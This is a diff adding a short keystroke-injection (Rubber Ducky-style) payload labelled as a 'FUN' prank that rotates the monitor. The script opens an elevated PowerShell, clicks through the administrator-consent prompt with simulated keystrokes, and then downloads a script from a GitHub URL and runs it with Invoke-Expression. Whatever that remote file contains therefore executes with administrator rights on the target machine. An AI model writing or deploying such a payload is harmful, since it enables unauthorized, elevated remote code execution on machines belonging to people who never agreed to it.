@@ -1,0 +1,16 @@
+REM Author: UNC0V3R3D
+REM Description: Uses powershell to rotate the monitor by 90 degrees.
+REM Version: 1.0
+REM Category: FUN
+DELAY 800
+GUI r
+DELAY 800
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 800
+ENTER
+DELAY 800
+LEFTARROW
+DELAY 800
+ENTER
+DELAY 500
+STRING Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/UNC0V3R3D/resources/main/monitor_rotation.ps1").Content
